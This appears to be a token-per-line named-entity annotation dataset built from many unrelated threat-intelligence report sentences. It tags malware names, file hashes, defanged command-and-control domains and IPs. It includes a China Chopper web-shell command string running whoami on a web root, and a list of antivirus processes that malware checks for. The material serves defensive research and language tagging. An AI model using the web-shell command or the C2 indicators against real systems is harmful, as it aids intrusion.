only	O
.	O

Their	O
tradecraft	O
is	O
superb	O
,	O
operational	O
security	O
second	O
to	O
none	O
and	O
the	O
extensive	O
usage	O
of	O
'	O
living-off-the-land	O
'	O
techniques	O
enables	O
them	O
to	O
easily	O
bypass	O
many	O
security	O
solutions	O
they	O
encounter	O
.	O

The	O
sample	O
we	O
analyzed	O
is	O
99	O
%	O
similar	O
to	O
the	O
documented	O
Bankshot	O
variants	O
from	O
2017.	O
spyware	O
on	O
victims	O
'	O
mobile	O
devices	O
by	O
uploading	O
maliciou	O
...	O
https://t.co/Ho6RhSKo5Emcafee_labs	O
Operation	O
GhostSecret	O
used	O
multiple	O
#	O
malware	O
implants	O
,	O
including	O
an	O
unknown	O
impact	O
with	O
capabilities	O
similar	O
to	O
Ban	O
...	O
https://t.co/20oXNJnL9LBankshot	O
implants	O
hosted	O
on	O
falcancoin.io	O
.	O

Figure	O
10	O
-	O
Response	O
from	O
the	O
C2C	O

The	O
open-source	O
cURL	O
library	O
is	O
a	O
multiprotocol	O
transfer	O
library	O
used	O
primarily	O
for	O
FTP	O
and	O
HTTP	O
transactions	O
.	O

The	O
banner	O
describes	O
the	O
botnet	B-malware.ransom
:	O
its	O
technical	O
features	O
the	O
available	O
commands	O
(	O
classic	O
ones	O
,	O
such	O
as	O
visiting	O
a	O
website	O
using	O
the	O
infected	O
bot	O
,	O
download	O
and	O
execute	O
a	O
command	O
or	O
a	O
library	O
,	O
update	O
and	O
uninstall	O
)	O
the	O
plugins	O
one	O
can	O
use	O
:	O
file	O
stealer	O
,	O
ad-clicker	O
,	O
form	O
grabber	O
,	O
...	O
The	O
command	O
'	O
visiting	O
a	O
website	O
'	O
using	O
the	O
infected	O
bot	O
could	O
be	O
used	O
by	O
the	O
attackers	O
as	O
an	O
entry	O
point	O
for	O
blackmailing	O
the	O
infected	O
user	O
.	O

For	O
specific	O
country	O
offices	O
and	O
contact	O
numbers	O
,	O
please	O
visit	O
our	O
website	O
.	O

This	O
version	O
was	O
called	O
'	O
CT	O
V2.1	O
'	O
by	O
the	O
author	O
,	O
which	O
may	O
indicate	O
that	O
there	O
were	O
other	O
earlier	O
versions	O
of	O
this	O
RAT	O
and	O
that	O
it	O
was	O
improved	O
upon	O
incrementally	O
.	O

This	O
is	O
significant	O
given	O
the	O
transfers	O
are	O
believed	O
to	O
have	O
occurred	O
in	O
the	O
two	O
days	O
prior	O
to	O
this	O
date	O
.	O

9d8e5ccd4cf543b4b41e4c6a1caae1409076a26ee74c61c148dffd3ce87d7787	B-hash
4e656834a93ce9c3df40fe9a3ee1efcccc728e7ea997dc2526b216b8fd21cbf6	B-hash

Command	O
Description	O

첨부	O
문서는	O
행사	O
관련	O
내용으로	O
위장하였으며	O
,	O
사용자가	O
파일을	O
열어	O
'	O
콘텐츠	O
사용'을	O
클릭해	O
매크로	O
기능을	O
활	O
성화하면	O
악성코드가	O
다운로드된다	O
.	O

2f8e5f81a8ca94ec36380272e36a22e326aa40a4	B-hash

A	O
server	O
housed	O
at	O
each	O
participant	O
's	O
location	O
allows	O
each	O
to	O
exchange	O
indicators	O
with	O
the	O
NCCIC	O
.	O

Web	O
.	O

Dark	O
Seoul	O
was	O
a	O
low	O
tech	O
threat	O
which	O
managed	O
to	O
escalate	O
into	O
a	O
high	O
impact	O
attack	O
.	O

getProcessList	O

We	O
code	O
named	O
the	O
vulnerability	O
as	O
'	O
double	O
kill	O
'	O
exploit	O
.	O

The	O
fourth	O
one	O
executes	O
the	O
malware	O
.	O

Initializes	O
the	O
module	O
used	O
for	O
communicating	O
with	O
the	O
C	O
&	O
C	O
servers	O
(	O
called	O
)	O
and	O
establishes	O
communication	O
between	O
the	O
malware	O
and	O
the	O
C	O
&	O
C	O
servers	O
.	O

Whenever	O
the	O
function	O
returns	O
,	O
it	O
calls	O
fill_memory_with_random_bytes	O
function	O
for	O
every	O
local	O
variable	O
it	O
used	O
,	O
so	O
that	O
the	O
stack	O
is	O
cleared	O
from	O
decoded	O
strings	O
.	O

08	O
–	O
Sectors	O
per	O
cluster	O
=	O
8	O
F8	O
–	O
Media	O
descriptor	O
(	O
Not	O
necessary	O
for	O
our	O
application	O
)	O
C0	O
F8	O
F8	O
0D	O
00	O
00	O
00	O
00	O
–	O
Total	O
sectors	O
in	O
file	O
system	O
,	O
0x00DF8F8C0	O
=	O
234420416	O
Sectors	O
(	O
Add	O
on	O
the	O
sector	O
location	O
of	O
VBR	O
for	O
actual	O
end	O
of	O
the	O
file	O
system	O
,	O
in	O
this	O
example	O
the	O
VBR	O
is	O
at	O
sector	O
63	O
therefore	O
the	O
total	O
sectors	O
in	O
the	O
file	O
system	O
are	O
234420416	O
+	O
63	O
=	O
234420479	O
)	O
00	O
00	O
0C	O
00	O
00	O
00	O
00	O
00	O
–	O
Starting	O
cluster	O
of	O
the	O
MFT	O
,	O
0X000C0000	O
=	O
786432	O
Clusters	O
.	O

The	O
succeeding	O
users	O
and	O
chatrooms	O
were	O
created	O
on	O
October	O
31	O
and	O
December	O
12	O
the	O
latest	O
.	O

Continuing	O
analysis	O
solidified	O
the	O
headquarters	O
component	O
's	O
Command	O
and	O
Control	O
(	O
C2	O
)	O
scheme	O
.	O

EBDD6059DA1ABD97E03D37BA001BAD4AA6BCBABD	B-hash
B769FE81996CBF7666F916D741373C9C55C71F15	I-hash
E64C2ED72A146271CCEE9EE904360230B69A2C1D	I-hash

Steal	O
credentials	O
from	O
Mozilla	O
Firefox	O
3	O
.	O

The	O
report	O
also	O
includes	O
the	O
findings	O
of	O
an	O
analysis	O
of	O
several	O
webservers	O
compromised	O
by	O
the	O
Energetic	O
Bear	O
group	O
during	O
2016	O
and	O
in	O
early	O
2017.T	O
he	O
table	O
below	O
shows	O
the	O
distribution	O
of	O
compromised	O
servers	O
(	O
based	O
on	O
the	O
language	O
of	O
website	O
content	O
and/or	O
the	O
origins	O
of	O
the	O
company	O
renting	O
the	O
server	O
at	O
the	O
time	O
of	O
compromise	O
)	O
by	O
countries	O
,	O
attacked	O
company	O
types	O
and	O
the	O
role	O
of	O
each	O
server	O
in	O
the	O
overall	O
attack	O
scheme	O
.	O

The	O
main	O
new	O
feature	O
is	O
the	O
obfuscation	O
–	O
almost	O
all	O
strings	O
are	O
obfuscated	O
and	O
the	O
XML	O
pattern	O
is	O
not	O
written	O
in	O
plain	O
text	O
anymore	O
.	O

Control	O
with	O
caution	O
and	O
let	O
the	O
code	O
Execute	O
function	O
ntdll	O
!	O
ZwContinue	O
.	O

Rifdoor	B-malware.backdoor
변형은	O
2015년	O
서울	O
아덱스	O
(	O
SEOUL	O
ADEX	O
)	O
참가	O
업체	O
공격에	O
사용되었으며	O
,	O
2016년	O
초	O
보안	O
업체	O
해킹에도	O
사용되었다	O
.	O

Fears	O
of	O
proliferation	O

Dropper	O
Observables	O

Attackers	O
are	O
starting	O
to	O
invest	O
in	O
longterm	O
operations	O
that	O
target	O
specific	O
processes	O
enterprises	O
rely	O
on	O
.	O

case	O
'	O
j	O
'	O
:	O

Figure	O
4	O
-	O
Installed	O
Files	O
from	O
the	O
Cisco	O
AnyConnect	O
Software	O
Install	O
Figure	O
5	O
-	O
Execution	O
of	O
Cisco	O
binary	O
vpnui.exe	O
(	O
MD5	O
:	O
68F1419721354EC1f78A71E10B54FCA8	B-hash
)	O
The	O
attacker	O
's	O
use	O
of	O
decoy	O
software	O
is	O
the	O
same	O
as	O
when	O
a	O
threat	O
actor	O
will	O
decide	O
to	O
display	O
a	O
decoy	O
PFD	O
or	O
Office	O
Document	O
,	O
to	O
give	O
the	O
victim	O
a	O
sense	O
that	O
everything	O
is	O
fine	O
and	O
that	O
there	O
is	O
no	O
need	O
to	O
inform	O
the	O
IT	O
or	O
the	O
Security	O
team	O
for	O
investigation	O
.	O

systemd	O
Vulnerability	O
Leads	O
to	O
Denial	O
of	O
Service	O
on	O
Linux	O
qkG	O
Filecoder	O
:	O
Self-Replicating	O
,	O
Document-Encrypting	O
Ransomware	O
Mitigating	O
CVE-2017-5689	O
,	O
an	O
Intel	O
Management	O
Engine	O
Vulnerability	O
A	O
Closer	O
Look	O
at	O
North	O
Korea	O
's	O
Internet	O
From	O
Cybercrime	O
to	O
Cyberpropaganda	O

And	O
much	O
of	O
the	O
malware	O
being	O
deployed	O
by	O
Sofacy	O
is	O
quickly	O
changed	O
from	O
C/C++	O
to	O
.Net	O
to	O
powershell	O
.	O

However	O
,	O
the	O
fact	O
there	O
are	O
still	O
unanswered	O
questions	O
about	O
The	O
Fidelis	O
XPS	O
advanced	O
threat	O
defense	O
system	O
has	O
been	O
updated	O
with	O
rules	O
to	O
detect	O
various	O
the	O
components	O
of	O
the	O
malware	O
system	O
and	O
its	O
intended	O
targeting	O
,	O
emphasizes	O
the	O
importance	O
of	O
employing	O
that	O
best	O
practices	O
such	O
as	O
denying	O
use	O
of	O
removable	O
media	O
on	O
sensitive	O
systems	O
and	O
disabling	O
autorun	O
!	O

The	O
pause	O
and	O
retooling	O
by	O
APT12	O
was	O
covered	O
in	O
the	O
Mandiant	O
2014	O
M-Trends	O
report	O
.	O

There	O
are	O
numerous	O
benefits	O
of	O
leveraging	O
a	O
zero-day	O
exploit	O
against	O
a	O
target	O
(	O
Figure	O
5	O
)	O
.	O

Unlike	O
other	O
*.dll.mui	O
files	O
in	O
%	O
SYSTEM	O
%	O
\en-US	O
directory	O
that	O
are	O
MZ	O
files	O
,	O
the	O
encrypted	O
payload	O
is	O
not	O
an	O
MZ	O
file	O
.	O

Version	O
:	O
1.2	O
WIDESTR	O

Started	O
:	O
5523F782	O
QWORD	O

Translation	O
accuracy	O
is	O
not	O
guaranteed	O
nor	O
implied	O
.	O

At	O
DNC	O
,	O
COZY	O
BEAR	O
intrusion	O
has	O
been	O
identified	O
going	O
back	O
to	O
summer	O
of	O
2015	O
,	O
while	O
FANCY	O
BEAR	O
separately	O
breached	O
the	O
network	O
in	O
April	O
2016	O
.	O

z1=cmdz2=cd	O
/d	O
'	O
c	O
:	O
\inetpub\wwwroot\	O
'	O
&	O
whoami	O
&	O
echo	O
[	O
S	O
]	O
&	O
cd	O
&	O
echo	O
[	O
E	O
]	O

While	O
Patchwork	O
may	O
be	O
more	O
straightforward	O
with	O
its	O
predominantly	O
malware-based	O
attacks	O
,	O
Confucius	O
'	O
can	O
be	O
inferred	O
to	O
be	O
more	O
nuanced	O
,	O
relying	O
heavily	O
on	O
social	O
engineering	O
.	O

The	O
U.S.	O
Government	O
confirms	O
that	O
two	O
different	O
RIS	O
actors	O
participated	O
in	O
the	O
intrusion	O
into	O
a	O
U.S.	O
political	O
party	O
.	O

In	O
this	O
post	O
,	O
we	O
examine	O
a	O
publicly	O
available	O
RAT	B-malware.backdoor
known	O
as	O
XtremeRAT	B-malware.backdoor
.	O

The	O
newer	O
SPLM	B-malware.backdoor
modules	O
are	O
deployed	O
mostly	O
to	O
Central	O
Asian	O
based	O
targets	O
that	O
may	O
have	O
a	O
tie	O
to	O
NATO	O
in	O
some	O
form	O
.	O

In	O
our	O
case	O
,	O
a	O
malicious	O
VBS	O
was	O
executed	O
,	O
which	O
installs	O
a	O
next	O
stage	O
payload	O
stored	O
in	O
CAB	O
file	O
:	O

Have	O
you	O
been	O
able	O
to	O
sinkhole	O
any	O
of	O
the	O
command	O
and	O
controls	O
?	O

SHA256	O
:	O

Considering	O
how	O
many	O
features	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
offers	O
,	O
it	O
is	O
incredibly	O
small—just	O
73	O
bytes	O
for	O
the	O
ASPX	O
version	O
,	O
or	O
4	O
kilobytes	O
on	O
disk	O
(	O
see	O
Figure	O
14	O
)	O
.	O

case	O
'	O
n	O
'	O
:	O

중앙관리	O
솔루션	O
........................................................................................................................................................	O
7	O
4	O
.	O

These	O
include	O
domains	O
,	O
file	O
names	O
,	O
Java	O
package	O
names	O
,	O
and	O
Facebook	O
activity	O
.	O

This	O
indicates	O
that	O
the	O
implant	O
was	O
active	O
in	O
South	O
Korea	O
and	O
targets	O
were	O
likely	O
being	O
infected	O
.	O

또한	O
vs1.vbs	B-malware.drop
,	O
winrm.vbs	B-malware.drop
등의	O
VB	O
스	O
크립트	O
파일을	O
생성해	O
악성	O
파일을	O
다운로드한다	O
.	O

Further	O
investigation	O
shows	O
that	O
the	O
same	O
registrant	O
email	O
id	O
was	O
also	O
used	O
to	O
register	O
another	O
similar	O
domain	O

User	O
Interaction	O
Required	O
Description	O

Number	O
of	O
object	O
files	O
,	O
Red	O
October	O
Office	O
plugin	O

This	O
type	O
of	O
obfuscation	O
is	O
used	O
by	O
those	O
that	O
have	O
'	O
strong	O
motives	O
to	O
prevent	O
their	O
malware	O
from	O
being	O
analyzed	O
'	O
.	O

The	O
result	O
is	O
the	O
following	O
assembly	O
listing	O
:	O

Contact	O
us	O
|	O
Privacy	O
Policy	O
|	O
Lice	O
nse	O
Agre	O
e	O
me	O
nt	O

During	O
investigation	O
into	O
the	O
infrastructure	O
used	O
by	O
Ghost	O
Dragon	O
,	O
an	O
anonymous	O
FTP	O
server	O
was	O
discovered	O
on	O
one	O
of	O
the	O
IP	O
addresses	O
listed	O
above	O
,	O
which	O
hosted	O
'	O
info.winupdate[.]net	B-url.cncsvr
|	O
122.10.36.94	B-ip.unknown
'	O
.	O

This	O
would	O
explain	O
the	O
inclusion	O
of	O
the	O
.NET	O
wrapper	O
.	O

The	O
information	O
included	O
in	O
the	O
report	O
indicated	O
that	O
the	O
perpetrators	O
used	O
the	O
same	O
malware	O
,	O
overlapping	O
infrastructure	O
,	O
and	O
similar	O
targets	O
as	O
APT32	B-malware.infosteal
.	O

It	O
is	O
likely	O
that	O
targeted	O
attacks	O
using	O
Asruex	B-malware.drop
will	O
continue	O
.	O

The	O
Darkhotel	B-malware.infosteal
APT	I-malware.infosteal
continues	O
to	O
spearphish	O
targets	O
around	O
the	O
world	O
,	O
with	O
a	O
wider	O
geographic	O
reach	O
than	O
its	O
previous	O
botnet	O
buildout	O
and	O
hotel	O
Wi-Fi	O
attacks	O
.	O

The	O
Tofu	B-malware.backdoor
backdoor	O
makes	O
extensive	O
use	O
of	O
threading	O
to	O
perform	O
individual	O
tasks	O
within	O
the	O
code	O
.	O

FTPManager	O
:	O
used	O
to	O
upload	O
file	O
to	O
the	O
server	O
using	O
credentials	O
received	O
in	O
a	O
previous	O
command	O
from	O
the	O
C	O
&	O
C	O
server	O
.	O

The	O
attacker	O
can	O
manipulate	O
the	O
process	O
into	O
an	O
unsafe	O
state	O
from	O
the	O
DCS	O
while	O
preventing	O
the	O
SIS	O
from	O
functioning	O
appropriately	O
.	O

The	O
complete	O
path	O
found	O
in	O
the	O
malware	O
presents	O
some	O
Korean	O
strings	O
:	O
D	O
:	O
rsh	O
UAC_dll	O
(	O
)	O
Releasetest.pdb	O
The	O
'	O
rsh	O
'	O
word	O
,	O
by	O
all	O
appearances	O
,	O
means	O
a	O
shortening	O
of	O
'	O
Remote	O
Shell	O
'	O
and	O
the	O
Korean	O
words	O
can	O
be	O
translated	O
in	O
English	O
as	O
'	O
attack	O
'	O
and	O
'	O
completion	O
'	O
,	O
i.e.	O
:	O
D	O
:	O
rshATTACKUAC_dll	O
(	O
COMPLETION	O
)	O
Releasetest.pdb	O
Although	O
the	O
full	O
list	O
of	O
victims	O
remains	O
unknown	O
,	O
we	O
managed	O
to	O
identify	O
several	O
targets	O
of	O
this	O
campaign	O
.	O

This	O
executable	O
is	O
a	O
data	O
stealer	O
,	O
which	O
enumerates	O
folders	O
and	O
harvests	O
files	O
of	O
format	O
doc	O
,	O
xls	O
,	O
ppt	O
,	O
pps	O
,	O
inp	O
,	O
pdf	O
,	O
xlsx	O
,	O
docx	O
,	O
pptx	O
.	O

The	O
contact	O
emails	O
and	O
contact	O
names	O
can	O
vary	O
,	O
but	O
the	O
address	O
is	O
re-used	O
.	O

Figure	O
8	O
.	O

If	O
you	O
have	O
received	O
it	O
in	O
error	O
,	O
<	O
=r	O
>	O
please	O
contact	O
us	O
immediately	O
by	O
return	O
e-­‐mail	O
and	O
delete	O
it	O
from	O
your	O
system	O
.	O

roscomnadzor	O
Another	O
rough	O
translation	O
from	O
Russian	O
to	O
English	O
:	O

Detection	O
of	O
the	O
malware	O
is	O
covered	O
in	O
detail	O
,	O
from	O
multiple	O
aspects	O
,	O
in	O
the	O
Detect	O
section	O
above	O
.	O

Scheduled	O
task	O
2	O
:	O
Uses	O
Javascript	O
to	O
download	O
a	O
Cobalt	O
Strike	O
Beacon	O
:	O
See	O
more	O
detailed	O
analysis	O
of	O
the	O
malicious	O
documents	O
in	O
our	O
Attack	O
Life	O
Cycle	O
section	O
.	O

3.2	O
FinSpy	B-malware.backdoor
Mobile	O
in	O
Vietnam	O

Figure	O
1	O
Figure	O
2	O
Figure	O
3	O
.	O

a3d3b0686e7bd13293ad0e63ebec67af	B-hash
)	O
in	O
addition	O
to	O
.....	O
The	O
'	O
Nflog	B-malware.backdoor
'	O
implant	O
emits	O
the	O
following	O
network	O
beacon	O
format	O
:	O

The	O
vulnerability	O
affects	O
the	O
latest	O
version	O
of	O
Internet	O
Explorer	O
and	O
applications	O
that	O
use	O
the	O
IE	O
kernel	O
and	O
has	O
been	O
found	O
to	O
be	O
used	O
for	O
targeted	O
APT	O
attacks	O
.	O

The	O
high	O
number	O
of	O
payloads	O
and	O
the	O
elaborate	O
C2	O
infrastructure	O
used	O
in	O
this	O
attack	O
can	O
be	O
indicative	O
of	O
the	O
resources	O
that	O
the	O
attackers	O
had	O
at	O
their	O
disposal	O
.	O

This	O
is	O
because	O
mshta.exe	O
does	O
n't	O
support	O
downloading	O
URL	O
contents	O
directly	O
to	O
an	O
arbitrary	O
location	O
.	O

Network	O
Detection	O
Signatures	O

As	O
part	O
of	O
Kaspersky	O
Lab	O
's	O
commitment	O
to	O
securing	O
cyberspace	O
for	O
everyone	O
,	O
we	O
reached	O
out	O
and	O
notified	O
identifiable	O
victims	O
,	O
regardless	O
of	O
their	O
security	O
solution	O
and	O
provided	O
them	O
with	O
indicators	O
of	O
compromise	O
(	O
IOCs	O
)	O
to	O
help	O
root	O
out	O
the	O
active	O
infection	O
.	O

•	O
Based	O
on	O
our	O
source	O
's	O
conversations	O
with	O
other	O
hackers	O
in	O
Iran	O
,	O
there	O
are	O
over	O
50	O
estimated	O
contractors	O
vying	O
for	O
Iranian	O
government-sponsored	O
offensive	O
cyber	O
projects	O
.	O

For	O
example	O
,	O
WinRAR	O
packs	O
and	O
encrypts	O
files	O
with	O
strong	O
suites	O
like	O
AES-256	O
,	O
and	O
TrueCrypt	O
encrypts	O
full	O
hard	O
drives	O
all	O
in	O
one	O
swoop	O
.	O

Record	O
#	O
0	O
Length	O
:	O
441	O
bytes	O
:	O

Dino	B-malware.backdoor
's	O
binary	O
is	O
statically	O
linked	O
with	O
the	O
GnuMP	O
library	O
,	O
which	O
is	O
used	O
to	O
manipulate	O
big	O
numbers	O
in	O
cryptography	O
algorithms	O
.	O

Outlook	B-malware.backdoor
backdoor	O
and	O
data	O
exfiltration	O
-	O
One	O
of	O
the	O
most	O
interesting	O
tools	O
introduced	O
by	O
the	O
attackers	O
was	O
the	O
Outlook	B-malware.backdoor
backdoor	O
,	O
which	O
used	O
Outlook	O
as	O
a	O
C2	O
channel	O
.	O

Hash	O
values	O
of	O
artifacts	O
demonstrated	O
in	O
this	O
article	O
are	O
described	O
in	O
Appendix	B-hash
C.	O
Also	O
,	O
destination	O
URLs	O
confirmed	O
by	O
JPCERT/CC	O
are	O
listed	O
in	O
Appendix	B-url.cncsvr
D	I-url.cncsvr
.	O

Function	O
DecryptCommandBuffer_sub_44C628	O
(	O
)	O

At	O
first	O
glance	O
,	O
it	O
seems	O
ChessMaster	O
's	O
evolution	O
over	O
the	O
past	O
few	O
months	O
involves	O
subtle	O
changes	O
.	O

When	O
visiting	O
sites	O
and	O
downloading	O
encryption-enabled	O
software	O
,	O
it	O
has	O
become	O
necessary	O
to	O
verify	O
the	O
validity	O
of	O
the	O
distribution	O
site	O
and	O
the	O
integrity	O
of	O
the	O
downloaded	O
file	O
itself	O
.	O

The	O
problem	O
with	O
publicly	O
published	O
vulnerabilities	O
is	O
people	O
can	O
defend	O
against	O
them	O
.	O

The	O
use	O
of	O
the	O
X-Agent	B-malware.infosteal
implant	O
in	O
the	O
original	O
30.apk	B-malware.backdoor
application	O
appears	O
to	O
be	O
the	O
first	O
observed	O
case	O
of	O
FANCY	O
BEAR	O
malware	O
developed	O
for	O
the	O
Android	O
mobile	O
platform	O
.	O

msseces.exe;msmpeng.exe	O
-	O
Microsoft	O
Security	O
Essentials	O
and	O
Microsoft	O
Anti-Malware	O
Service	O
AVK.exe;AVKTray.exe	O
-	O
G-Data	O
avas.exe	O
-	O
TrustPort	O
AV	O
tptray.exe	O
-	O
Toshiba	O
utility	O
fsma32.exe;fsorsp.exe	O
-	O
F-Secure	O
econser.exe;escanmon.exe	O
-	O
Microworld	O
Technologies	O
eScan	O
SrvLoad.exe;PSHost.exe	O
-	O
Panda	O
Software	O
egui.exe;ekrn.exe	O
-	O
ESET	O
Smart	O
Security	O
pctsSvc.exe;pctsGui.exe	O
-	O
PC	O
Tools	O
Spyware	O
Doctor	O
casc.exe;UmxEngine.exe	O
-	O
CA	O
Security	O
Center	O
cmdagent.exe;cfp.exe	O
-	O
Comodo	O
KVSrvXP.exe;KVMonXP.exe	O
-	O
Jiangmin	O
Antivirus	O
nsesvc.exe;CClaw.exe	O
-	O
Norman	O
V3Svc.exe	O
-	O
Ahnlab	O
guardxup	O
.	O

Figure	O
2	O
.	O

Victims	O
of	O
the	O
threat	O
actor	O
's	O
attacks	O
were	O
not	O
limited	O
to	O
industrial	O
companies	O
.	O

This	O
function	O
will	O
either	O
bind	O
the	O
calling	O
process	O
to	O
a	O
port	O
or	O
has	O
the	O
calling	O
process	O
connect	O
to	O
a	O
remote	O
host	O
.	O

FireEye	O
is	O
a	O
registered	O
trademark	O
of	O
FireEye	O
,	O
Inc	O
.	O

The	O
image	O
below	O
does	O
not	O
include	O
any	O
data	O
,	O
as	O
we	O
do	O
n't	O
want	O
to	O
disclose	O
any	O
of	O
the	O
victims	O
'	O
locations	O
,	O
but	O
shows	O
the	O
region	O
where	O
Tempting	B-malware.infosteal
Cedar	I-malware.infosteal
was	O
spread	O
the	O
most	O
:	O
Other	O
hosts	O
with	O
this	O
common	O
name	O
are	O
easy	O
to	O
find	O
using	O
open	O
source	O
tools	O
:	O
We	O
created	O
an	O
image	O
of	O
the	O
computer	O
infrastructure	O
used	O
in	O
the	O
campaign	O
:	O
It	O
is	O
always	O
difficult	O
to	O
attribute	O
persistent	O
threat	O
campaigns	O
,	O
like	O
this	O
one	O
,	O
to	O
cybercriminals	O
.	O

Contact	O
Us	O
:	O

8c18852f79f14880ed9bd1d3be2fa48c	B-hash
alertmymail[.]com	B-url.cncsvr
ddd6b9bef4d37b43484d1a0eab4753c6	B-hash
alertmymail[.]com	B-url.cncsvr
99f7cb87a4acbbd2aed2c4e860cd0f5a	B-hash
necessaries-documentation[.]com	B-url.cncsvr
04af2e8a7a1e934ab2000d701948a657	B-hash
newsfairprocessing[.]com	B-url.cncsvr
1f72e19999d56a11cd564d1f7b0652e7	B-hash
2683e1d77b20e7aa75ade640ddb522d6	B-hash
6d6fe7d36e1c43aab534644378d56dfb	B-hash
westdelsys[.]com	B-url.cncsvr
14a11b125f32a5a5773c23021ac4c1a1	B-hash
manufacturing-minds[.]com	B-url.cncsvr
84e2d98e4b3272b953b63d2021735fd3	B-hash
fcccf9cb698297bb686561e7af7dad94	B-hash
servicesprocessing[.]com	B-url.cncsvr
f0ef59265610dedab40f8386af79f861	B-hash

As	O
always	O
,	O
attackers	O
make	O
mistakes	O
and	O
give	O
away	O
hints	O
about	O
what	O
providers	O
and	O
registrars	O
they	O
prefer	O
.	O

However	O
,	O
the	O
work	O
is	O
only	O
covering	O
small	O
aspects	O
(	O
based	O
on	O
the	O
indicators	O
given	O
,	O
lacking	O
full	O
context	O
)	O
and	O
not	O
an	O
exhaustive	O
analysis	O
,	O
and	O
hence	O
the	O
report	O
is	O
as-is	O
,	O
not	O
giving	O
any	O
guarantees	O
of	O
completeness	O
or	O
claiming	O
absolute	O
accuracy	O
.	O

The	O
attacks	O
can	O
be	O
dated	O
back	O
to	O
2007	O
and	O
are	O
still	O
very	O
active	O
.	O

A	O
176.56.238.177	B-ip.unknown
games-playbox[.]com	B-url.cncsvr
.	O

Action	O

Figure	O
6	O
-	O
VirusTotal	O
score	O

Document	O
Status	O
:	O
Last	O
Revised	O
:	O
2014-05-21	O

Launcher	O
reloadItSelf	O
:	O
]	O

Sample	O
B	O
is	O
identified	O
to	O
be	O
a	O
HTTP	O
controlled	O
backdoor	O
,	O
enabling	O
the	O
attacker	O
to	O
take	O
full	O
control	O
over	O
the	O
victim	O
computer	O
.	O

The	O
main	O
backdoor	O
used	O
by	O
attackers	O
was	O
the	O
open-source	O
Tiny	B-malware.backdoor
Meterpreter	I-malware.backdoor
.	O

We	O
would	O
also	O
like	O
to	O
thank	O
our	O
friends	O
and	O
family	O
who	O
supported	O
us	O
throughout	O
this	O
research	O
.	O

One	O
of	O
the	O
services	O
they	O
provide	O
is	O
FinFisher	B-malware.infosteal
:	O
IT	O
Intrusion	O
,	O
including	O
the	O
FinSpy	B-malware.infosteal
tool	O
.	O

Given	O
Lazarus	O
'	O
use	O
of	O
a	O
wide	O
array	O
of	O
tools	O
and	O
techniques	O
in	O
their	O
operations	O
,	O
it	O
's	O
reasonable	O
to	O
assume	O
that	O
the	O
group	O
will	O
continue	O
to	O
use	O
ever-evolving	O
tactics	O
in	O
their	O
malicious	O
activities	O
.	O

I	O
got	O
a	O
letter	O
from	O
the	O
government	O
the	O
other	O
day	O
Opened	O
it	O
and	O
read	O
it	O
It	O
said	O
they	O
were	O
suckers	O

Ability	O
to	O
sleep	O
for	O
a	O
given	O
number	O
of	O
seconds	O
.	O

of	O
the	O
current	O
key	O
string	O
byte	O
.	O

Currently	O
,	O
Iran	O
faces	O
the	O
prospect	O
of	O
negative	O
economic	O
impact	O
via	O
renewed	O
sanctions	O
.	O

hXXp://985.so/bUYjN/A	B-url.unknown
(	O
HTTP	O
404	O
)	O
hXXp://985.so/bUYe	B-url.unknown
hXXp://58.64.178.77:80/SiteLoader	B-url.unknown
hXXp://985.so/b6hW	B-url.unknown
hXXp://58.64.178.77/mPlayer	B-url.unknown
hXXp://985.so/bUYf	B-url.unknown
hXXp://58.64.178.77:80/0wnersh1p	B-url.unknown
These	O
pages	O
load	O
scripts	O
that	O
conduct	O
profiling	O
of	O
the	O
system	O
for	O
various	O
software	O
,	O
plugins	O
,	O
and	O
other	O
related	O
information	O
,	O
as	O
well	O
as	O
load	O
Java	O
exploits	O
designed	O
to	O
install	O
malware	O
on	O
the	O
target	O
system	O
.	O

Upon	O
adding	O
a	O
network	O
drive	O
,	O
the	O
hook	O
calls	O
its	O
'	O
RecordToFile	O
'	O
file	O
stealer	O
method	O
.	O

Backdoors	O
exploiting	O
DLL	O
hijacking	O
against	O
trusted	O
applications	O

1	O
.	O

The	O
analysis	O
of	O
this	O
APT	O
proves	O
how	O
determined	O
and	O
motivated	O
the	O
attackers	O
were	O
.	O

Looking	O
back	O
at	O
other	O
high	O
profile	O
cases	O
,	O
such	O
as	O
the	O
Bangladesh	B-malware.unknown
Bank	I-malware.unknown
Heist	I-malware.unknown
or	O
Wannacry	B-malware.unknown
,	O
there	O
were	O
few	O
facts	O
linking	O
them	O
to	O
the	O
Lazarus	O
group	O
.	O

Figure	O
8	O
.	O

The	O
RLO	O
character	O
(	O
U+202e	O
in	O
unicode	O
)	O
controls	O
the	O
positioning	O
of	O
characters	O
in	O
text	O
containing	O
characters	O
flowing	O
from	O
right	O
to	O
left	O
,	O
such	O
as	O
Arabic	O
or	O
Hebrew	O
.	O

2016	O
.	O

The	O
attacker	O
also	O
changed	O
the	O
default	O
process	O
mutex	O
name	O
.	O

Ministry	O
of	O
Unification	O

Upon	O
receiving	O
the	O
malicious	O
document	O
,	O
the	O
user	O
is	O
advised	O
to	O
enable	O
macros	O
.	O

CV.doc	O
Complaint	O
letter.doc	O
License	O
Agreement.doc	O

T	O
HREAT	O
S	O
CAT	O
EGORIES	O
T	O
AGS	O
ENCYCLOPEDIA	O
ST	O
AT	O
IST	O
ICS	O
DESCRIPT	O
IONS	O

This	O
is	O
an	O
initial	O
request	O
that	O
the	O
backdoor	O
would	O
send	O
out	O
on	O
port	O
443	O
to	O
an	O
active	O
C	O
&	O
C	O
:	O
00000000	O
c4	O
4c	O
87	O
3f	O
11	O
1e	O
c4	O
1a	O
2c	O
a9	O
12	O
1a	O
19	O
61	O
82	O
de	O
|	O
.L	O
.	O
?	O

Implement	O
strict	O
access	O
control	O
and	O
application	O
whitelisting	O
on	O
any	O
server	O
or	O
workstation	O
endpoints	O
that	O
can	O
reach	O
the	O
SIS	O
system	O
over	O
TCP/IP	O
.	O

on	O
the	O
intermediate	O
buffer	O
and	O
a	O
global	O
string	O
to	O
produce	O
a	O
final	O
buffer	O
;	O
3	O
.	O

'	O
x-	O
'	O
:	O
a	O
)	O
+	O
Math.floor	O
(	O
Math.random	O
(	O
)	O
*	O
99999	O
)	O
\	O
;	O
)	O
'	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content	O
:	O
'	O
return	O
(	O
(	O
!	O
a	O
)	O
?	O

In	O
case	O
of	O
Uri	O
Terror	O
Report.doc	O
the	O
malicious	O
activity	O
triggered	O
when	O
the	O
document	O
was	O
either	O
closed	O
or	O
when	O
the	O
show	O
document	O
button	O
was	O
clicked	O
,	O
when	O
any	O
of	O
these	O
event	O
occurs	O
a	O
malicious	O
obfuscated	O
